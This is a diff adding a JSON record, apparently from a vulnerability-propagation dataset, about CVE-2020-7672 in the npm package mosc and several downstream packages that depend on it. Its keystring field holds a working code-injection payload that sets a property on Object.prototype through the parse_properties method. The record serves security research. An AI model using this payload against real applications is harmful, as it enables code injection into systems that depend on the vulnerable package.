@@ -1,0 +1,16 @@
+{
+    "id": "CVE-2020-7672",
+    "upstream": "mosc@1.0.0",
+    "keymethod": "parse_properties",
+    "keystring": "{a:*1*; 1 + (Object.prototype.polluted = `yes`)  //*}",
+    "location": "mosc.js:50:43",
+    "downstreams": [
+        "morx@0.0.5",
+        "flw-notif@0.0.5",
+        "flw-notifier@0.0.6",
+        "logitlib@1.0.0",
+        "@iykedapotential/flw-notifier@0.0.6",
+        "morxv2@1.0.0",
+        "@andromeda/mir-da@0.0.13"
+    ]
+}
